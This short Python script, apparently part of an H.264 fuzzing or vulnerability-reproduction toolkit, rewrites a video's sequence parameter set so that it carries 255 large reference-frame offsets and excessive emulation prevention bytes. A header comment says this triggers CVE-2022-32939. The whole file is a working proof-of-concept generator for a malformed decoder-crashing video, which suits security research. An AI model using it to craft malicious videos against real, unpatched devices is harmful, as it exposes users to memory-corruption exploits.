##
# too_many_epbs
#
# Generate a video that has too many emulation prevention bytes by
# setting really large num_ref_frames_in_pic_order_cnt_cycle
#
# Triggers CVE-2022-32939
##
def too_many_epbs(ds):
    print("\t Adding enough offset_for_ref_frame to get a large number of epbs")
    sps_idx = 0

    ds["spses"][sps_idx]["pic_order_cnt_type"] = 1 # Mandatory

    # Set the pic_order_cnt_type == 1 syntax elements
    ds["spses"][sps_idx]["delta_pic_order_always_zero_flag"] = False
    ds["spses"][sps_idx]["offset_for_non_ref_pic"] = -1073741824
    ds["spses"][sps_idx]["offset_for_top_to_bottom_field"] = -1073741824

    # This generates 515 emulation prevention bytes
    num_pic_order_cnt_cycle = 255 
    ds["spses"][sps_idx]["num_ref_frames_in_pic_order_cnt_cycle"] = 255
    ds["spses"][sps_idx]["offset_for_ref_frame"] = [-1073741824] * (num_pic_order_cnt_cycle)

    # Need to adjust the slice for a different pic_order_cnt_type
    for i in range(len(ds["slices"])):
        ds["slices"][i]["sh"]["delta_pic_order_cnt"] = [0, 0]

    return ds

def modify_video(ds):
    return too_many_epbs(ds)